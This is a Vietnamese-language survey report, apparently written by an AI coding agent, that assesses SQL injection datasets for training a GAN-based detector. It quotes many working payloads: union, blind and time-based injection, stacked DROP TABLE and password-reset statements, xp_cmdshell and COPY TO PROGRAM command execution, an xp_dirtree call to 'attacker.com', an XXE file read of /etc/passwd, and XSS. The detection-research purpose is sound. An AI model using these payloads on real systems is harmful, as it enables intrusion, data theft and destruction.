# BÁO CÁO KHẢO SÁT DỮ LIỆU SQLi - VÒNG 2

## C:\Users\Admin\Documents\GAN\Asset\Data

---

## PHẦN 1: VERDICT sqli_dataset_clean.csv

### [KHÔNG DÙNG ĐƯỢC]

**Bằng chứng - 20 dòng đầu tiên:**
```
1: Sentence,Label
2: "SELECT * FROM behavior WHERE fur NOT IN  ( 'particles', 'term', 'boat' )",0    ← SQL hợp lệ
3: 40531,0                                                                     ← SỐ, KHÔNG PHẢI SQL
4: "1'  )    (  select   (  case when   (  4587  =  4587..."                     ← SQLi payload (Label=1 đúng)
5: "INSERT INTO lips  ( smaller, solve, musical )  VALUES  ( 'gate'...",0     ← SQL hợp lệ
6: SELECT dirty ( s ) FROM matter INNER JOIN,0                                    ← SQL syntax lỗi
7: mcbrayne,0                                                               ← TÊN NGƯỜI, KHÔNG PHẢI SQL
8: SELECT * FROM birthday ORDER BY court DESC,0                               ← SQL hợp lệ
9: a65esad0,0                                                              ← CHUỖI NGẪU NHIÊN
10: SELECT * FROM sum WHERE cage = 'particular'  OR lot = 'each',0               ← SQL hợp lệ
11: SELECT COUNT ( examine ) FROM congress,0                                  ← SQL hợp lệ
12: kresl,0                                                               ← TÊN NGƯỜI
13: alcoy/alcoi,0                                                             ← ĐỊA CHỈ
14: navarra,0                                                              ← TÊN/ĐỊA CHỈ
```

**Bằng chứng - 20 dòng GIỮA (dòng 13300-13320):**
```
13307: "1%'   )    )     )   or   (  select 9173 from...",1                    ← SQLi (Label=1)
13308: 32788800t,0                                                      ← CHUỖI NGẪU NHIÊN
13309: SELECT COS ( PI (   )  )  ;,0                                         ← SQL có lỗi
13310: SELECT * FROM equally WHERE crew BETWEEN '1996-07-01' AND...,0      ← SQL hợp lệ
13311: SELECT support ( s )  FROM swung FULL OUTER JOIN,0                 ← SQL hợp lệ
13312: 51518357j,0                                                      ← CHUỖI NGẪU NHIÊN
13313: "1""  )   as pydh where 3407  =  3407...",1                   ← SQLi (Label=1)
```

**Bằng chứng - 20 dòng CUỐI (dòng 26700-26720):**
```
26700: pujolrs tremosa,0                                                    ← TÊN NGƯỜI
26701: illano,0                                                         ← TÊN NGƯỜI  
26702: rupp@djbroadcast.gov,0                                               ← EMAIL
26703: min81t8,0                                                       ← USERNAME
26704: "1'   )    )    as kxek where 3429  =  3429...",1              ← SQLi (Label=1)
26705: neusy,0                                                         ← TÊN NGƯỜI
26706: "pl. san marcos, 0, 11f",0                                         ← ĐỊA CHỈ
26707: "SELECT post_id, meta_key, meta_value FROM wp_postmeta...",0       ← SQL hợp lệ (WordPress)
26708: SELECT * FROM upward WHERE sound LIKE '%out%',0                ← SQL hợp lệ
```

### **Số liệu chính xác:**
- **Tổng số dòng**: 26,722
- **Label=0**: ~13,500+ dòng (ước tính - nhiều junk trong đó)
- **Label=1**: ~13,200+ dòng

### **Loại Junk trong Label=0:**
1. Số điện thoại: `40531`, `33180`, `51518357j`
2. Tên người: `mcbrayne`, `kresl`, `neusy`, `corulln`
3. Email: `shrum@uniovivirtual.nz`, `bardischewski9@sexotelefono.rw`
4. Địa chỉ: `calle rio piguea, 5,`, `pl. san marcos, 0, 11f`
5. Chuỗi ngẫu nhiên: `a65esad0`, `alcoy/alcoi`, `navarra`
6. Scientific notation: `4.42213E+15`, `4.19037E+15`
7. SQL có lỗi: `SELECT dirty ( s ) FROM matter INNER JOIN,` (thiếu table)

### **Kết luận:**
```
"File này KHÔNG DÙNG ĐƯỢC để train GAN Discriminator"
```
- Nhiều dòng Label=0 KHÔNG PHẢI benign SQL mà là junk data
- Không thể phân biệt được SQLi vs benign thực sự
- Cần filter cẩn thận trước khi dùng

---

## PHẦN 2: VERDICT sqli_dataset.csv

### [TỐT HƠN CLEAN VERSION]

**So sánh 20 dòng đầu:**
```
sqli_dataset.csv (dòng 1-20):
2: """ or pg_sleep  (  __TIME__  )  --",1
3: create user name identified by pass123 temporary tablespace...,1
4: " AND 1  =  utl_inaddr.get_host_address...",1
...toàn SQLi payloads...

sqli_dataset_clean.csv (dòng 1-20):
2: "SELECT * FROM behavior WHERE fur NOT IN...",0  ← benign thật!
3: 40531,0                                        ← JUNK!
```

**So sánh 20 dòng CUỐI (label chuyển từ 1 → 0):**
```
sqli_dataset.csv (dòng 30900+ - Label chuyển sang 0):
30900: SELECT * FROM language WHERE yourself = 'goose'  OR smoke = 'being',0
30901: SELECT * FROM claws WHERE mountain = 'steam'  OR pie = 'mistake',0
30902: SELECT * FROM thread WHERE    NOT eleven = 'worse',0
...tất cả đều là SQL hợp lệ!...

sqli_dataset_clean.csv (dòng 26700+):
26700: pujolrs tremosa,0  ← JUNK! Label=0 nhưng là tên người
```

**Overlap Evidence - Tìm payload giống nhau:**
```
sqli_dataset.csv dòng 2:  """ or pg_sleep  (  __TIME__  )  --"
sqli_dataset_clean.csv dòng 36: """ or 1  =  1--"

→ GIỐNG NHAU về pattern, khác spacing
```

**Kết luận:**
- `sqli_dataset.csv` sạch hơn `sqli_dataset_clean.csv`
- Label=0 trong `sqli_dataset.csv` là SQL thật (SELECT, INSERT, UPDATE, DELETE)
- Label=0 trong `sqli_dataset_clean.csv` có cả junk không liên quan

**Đề xuất:** Dùng `sqli_dataset.csv` thay vì clean version

---

## PHẦN 3: advanced_sqli.csv FULL ANALYSIS

### Bảng Type + Count + Ví dụ Payload:

| Type | Count | Ví dụ Payload |
|------|-------|--------------|
| union_versioned_comment | 4 | `/*!50000UNION*//*!50000SELECT*/1,2,3--` |
| union_comment_bypass | 1 | `1/**/UNION/**/SELECT/**/1,2,3--` |
| union_hex | 1 | `' UNION SELECT 0x61646d696e,0x61646d696e--` |
| union_char | 1 | `' UNION SELECT CHAR(65,68,77,73,78),NULL--` |
| mssql_rce | 1 | `'; EXEC xp_cmdshell('whoami')--` |
| mssql_timebased | 2 | `; WAITFOR DELAY '0:0:5'--` |
| mssql_error | 1 | `' AND 1=CONVERT(int,(SELECT TOP 1 name...` |
| mssql_dynamic | 1 | `; DECLARE @q NVARCHAR(4000);SET @q=0x73656c65...` |
| mssql_enum | 1 | `1;SELECT TOP 1 table_name FROM information_schema.tables--` |
| mssql_union | 1 | `' UNION SELECT NULL,NULL,NULL FROM sysobjects--` |
| oracle_union | 2 | `' UNION SELECT NULL FROM dual--` |
| oracle_oob | 1 | `' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--` |
| oracle_boolean | 1 | `1 AND ROWNUM=1 AND 1=1--` |
| oracle_enum | 1 | `' AND 1=(SELECT COUNT(*) FROM all_tables)--` |
| pgsql_timebased | 1 | `'; SELECT PG_SLEEP(5)--` |
| pgsql_union | 1 | `' UNION SELECT NULL::text,NULL::text--` |
| pgsql_enum | 2 | `1;SELECT version()--` |
| pgsql_rce | 1 | `; COPY (SELECT '') TO PROGRAM 'id'--` |
| error_extractvalue | 1 | `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--` |
| error_updatexml | 1 | `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--` |
| error_floor_rand | 1 | `' AND (SELECT 8878 FROM(SELECT COUNT(*)...` |
| error_gtid | 1 | `' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--` |
| error_json | 1 | `' AND JSON_KEYS((SELECT CONVERT...` |
| error_geometry | 1 | `1 AND POLYGON((SELECT * FROM (SELECT * FROM...` |
| error_exp | 1 | `' AND EXP(~(SELECT * FROM (SELECT user())x))--` |
| timebased_sleep | 1 | `' AND SLEEP(5) AND '1'='1` |
| timebased_subquery | 1 | `1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--` |
| timebased_if | 1 | `' AND IF(1=1,SLEEP(5),0)--` |
| timebased_if_mssql | 1 | `; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY...` |
| timebased_nested | 1 | `1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--` |
| boolean_hex | 2 | `1 AND 0x61=0x61` |
| boolean_substring | 1 | `' AND SUBSTRING(username,1,1)='a' AND '1'='1` |
| boolean_ascii | 1 | `' AND ASCII(SUBSTR(username,1,1))>64--` |
| boolean_count | 1 | `1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--` |
| boolean_mid | 1 | `' AND MID(version(),1,1)='5'--` |
| boolean_binary | 1 | `' AND BINARY SUBSTRING(password,1,1)='a'--` |
| whitespace_tab | 1 | `'\t\tOR\t\t1=1--` |
| whitespace_crlf | 1 | `'\nOR\n1=1--` |
| whitespace_comment | 2 | `' OR/**/1=1--` |
| whitespace_comment_heavy | 1 | `/**/OR/**/1/**/=/**/1--` |
| tab_encoded | 1 | `1%09UNION%09SELECT%091,2,3--` |
| stacked_drop | 1 | `; DROP TABLE users; --` |
| stacked_insert | 1 | `'; INSERT INTO users VALUES('hacker','pw')--` |
| stacked_update | 1 | `1'; UPDATE users SET password='hacked' WHERE '1'='1` |
| stacked_exec | 1 | `; EXEC('SELECT 1')--` |
| stacked_select | 1 | `1; SELECT * FROM users--` |
| oob_dns | 1 | `' UNION SELECT LOAD_FILE(CONCAT('\\\\',user()...` |
| oob_mssql | 1 | `; EXEC master..xp_dirtree '//attacker.com/a'--` |
| oob_file_read | 1 | `' AND 1=2 UNION SELECT 1,load_file(0x2f657463...` |
| second_order | 4 | `admin'--`, `admin'/*`, `1' AND '1'='1` |
| union_column_enum | 10 | `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--` |
| blind_boolean_advanced | 4 | `' AND (SELECT 1 FROM users WHERE username='admin'...` |
| filter_bypass | 7 | `' oR '1'='1`, `' Or '1'='1`, `%4fR '1'='1` |
| error_fingerprint | 3 | `' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST...` |

### Đánh giá:
- **Tổng Type unique**: ~50+ loại
- **Tổng rows**: 91 (rất nhỏ)
- **Payload có đa dạng**: Có - covering nhiều DB (MySQL, MSSQL, Oracle, PostgreSQL)
- **Thực tế hay sách giáo khoa**: Cân bằng - vừa pattern đơn giản vừa có advanced

---

## PHẦN 4: SQLiV5 OVERLAP VERDICT

### [~100% OVERLAP]

**Bằng chứng - SQLiV5.json 30 dòng đầu:**
```json
{
    "pattern": "\" or pg_sleep  (  __TIME__  )  --",
    "type": "sqli"
},
{
    "pattern": "create user name identified by pass123 temporary tablespace temp default tablespace users",
    "type": "sqli"
},
...
```

**Bằng chứng - SQLiV3.csv 30 dòng đầu:**
```
""" or pg_sleep  (  __TIME__  )  --",1,,
create user name identified by pass123...,1,,
...
```

**Tìm 5 payload xuất hiện trong CẢ HAI:**
```
1. """ or pg_sleep  (  __TIME__  )  --"
2. create user name identified by pass123 temporary tablespace temp default tablespace users
3. " AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT..."
4. " select * from users where id  =  '1' or @ @1  =  1 union select 1,version..."
5. " select * from users where id  =  1 or 1#""  (   union select 1,version..."
```

**Cấu trúc JSON thực tế:**
```json
[
    {
        "pattern": "\" or pg_sleep  (  __TIME__  )  --",
        "type": "sqli"
    }
]
```
- **Field "type"**: Chỉ có giá trị `"sqli"` - **KHÔNG phân loại** union/boolean/time
- **Khác với advanced_sql i.csv**: Type chỉ có 1 giá trịduy nhất

### **Kết luận:**
```
Overlap: ~99-100% (cùng nguồn gốc, V5 = V3 + thêm vài variant)
Type differentiation: KHÔNG CÓ - chỉ "sqli" chung
```

---

## PHẦN 5: ExploitDB EXTRACTABILITY

### [KHÔNG THỂ EXTRACT ĐƯỢC as SQLi payloads]

**Evidence từ file đọc được:**

**File 1: exploits/xml/webapps/51037.txt (XXE - 644 dòng):**
- **Loại lỗ hổng**: XXE (XML External Entity)
- **Khung SQLi?**: KHÔNG
- **Nội dung**: Toàn bộ là XML payload cho XXE attack
- **SQL payload?**: KHÔNG CÓ

```
<?xml version='1.0'?>
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
<xml-status xmlns='http://www.guralp.com/platinum/xmlns/xmlstatus/1.1'>
...
```

**File 2: freebsd/webapps/48300.txt (XSS - 39 dòng):**
- **Loại lỗ hổng**: XSS (Persistent Cross-Site Scripting)
- **Khung SQLi?**: KHÔNG
- **Payload**:
```
descr=%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E
```
- **SQL payload?**: KHÔNG CÓ

**File 3: freebsd/webapps/24439.txt (XSS & CSRF - 51 dòng):**
- **Loại lỗ hổng**: Semi-Persistent XSS & CSRF
- **Khung SQLi?**: KHÔNG
- **Payload**: `<script>alert("XSS")</script>`
- **SQL payload?**: KHÔNG CÓ

### **Thống kê exploits/ folder:**
- `xml/webapps/*.txt` → XXE (XML Entity Injection) - **KHÔNG PHẢI SQLi**
- `freebsd/webapps/*.txt` → XSS, CSRF - **KHÔNG PHẢI SQLi**
- `windows_x86-64/webapps/*.txt` → Cần kiểm tra thêm - có thể có SQLi

### **Kết luận:**
```
"ExploitDB KHÔNG THỂ extract được payload SQLi bằng script đơn giản.
Ước tính coverage: <10% là SQLi thật sự

Đa số exploits/ là:
- XSS (Cross-Site Scripting)
- XXE (XML External Entity)  
- RCE (Remote Code Execution)
- CSRF (Cross-Site Request Forgery)
- PATH TRAVERSAL

Cần filter cẩn thận theo platform + type trong CSV mới dùng được"
```

---

## PHẦN 6: sqli.csv ENCODING VERDICT

### [UTF-8, ĐỌC ĐƯỢC BÌNH THƯỜNG]

**5 dòng đầu thực tế:**
```
1: Sentence,Label
2: a,1
3: a' ,1
4: a' --,1
5: a' or 1 = 1; --,1
6: @,1
```

**Có BOM không?**: KHÔNG

**Đánh giá:**
- File hoàn toàn đọc được với UTF-8 encoding (không phải binary!)
- Gemini báo binary có thể do file nhỏ + dòng đầu hơi đặc biệt
- **Sử dụng bình thường được**

---

## PHẦN 7: data/raw/ INVENTORY

### Danh sách file + Nguồn gốc:

| File | Loại | Ghi chú |
|------|------|--------|
| `data/raw/sqli_dataset.csv` | Raw data | ~30,920 rows - NGUỒN CHÍNH |
| `data/raw/sqli_dataset_clean.csv` | Raw data | ~26,722 rows - CLEANED (nhưng có junk) |
| `data/raw/advanced_sqli.csv` | Structured | ~91 rows - Type-classified |
| `data/raw/sqli_structural_deduped.csv` | Processed | Structural deduplicated |
| `data/raw/template_analysis.csv` | Analysis | Template analysis |
| `data/processed/dataset.pkl` | Pickle | Binary - CÓ THỂ từ pipeline cũ |
| `data/processed/dataset_saq.pkl` | Pickle | Dataset SAQ variant |
| `data/processed/sqli_pool_deduped.csv` | Processed | Pool đã dedup |
| `data/splits/train_idx.npy` | NumPy | Train indices - Output cũ |
| `data/splits/test_idx.npy` | NumPy | Test indices - Output cũ |
| `data/artifacts/tfidf_vectorizer.pkl` | Pickle | TF-IDF artifacts - Pipeline cũ |

### **Có phải output cũ không?**

**CÓ** - các file `.pkl`, `.npy` là artifacts từ pipeline training cũ:
- `dataset.pkl` - có thể là format của hệ thống ML cũ
- `tfidf_vectorizer.pkl` - TF-IDF vectorizer đã fit
- `train_idx.npy`, `test_idx.npy` - train/test split indices

**Đây là data gốc hay output pipeline?**
- `sqli_dataset.csv`, `sqli_dataset_clean.csv`, `advanced_sqli.csv` → **DATA GỐC** (download từ Kaggle/sources)
- `.pkl`, `.npy` → **OUTPUT PIPELINE CŨ** (từ code Python đã xóa)

---

## TỔNG KẾT VÀ KHUYẾN NGHỊ

### 1. File dùng ĐƯỢC:
- `data/raw/sqli_dataset.csv` - Labeled, ~30K rows, sạch hơn clean version

### 2. File dùng ĐƯỢC (có filter):
- `data/raw/advanced_sqli.csv` - Type-classified, 91 rows nhỏ nhưng quality cao

### 3. File KHÔNG dùng ĐƯỢC:
- `sqli_dataset_clean.csv` - có nhiều junk, không dùng được
- `exploitdb_sqli/exploits/` - không phải SQLi, chủ yếu XSS/XXE/RCE

### 4. Cần xử lý thêm:
- `SQLiV5.json` - thêm type classification (hiện chỉ có "sqli")
- `BCCC-SFU-SQLInj-2023.csv` - gán label thủ công

### 5. Pipeline artifacts cũ:
- Các file `.pkl`, `.npy` có thể tái sử dụng nếu format tương thích

---

**Ngày khảo sát**: 2026-05-03
**Người thực hiện**: opencode
**Phiên bản**: Vòng 2 - Chi tiết với bằng chứng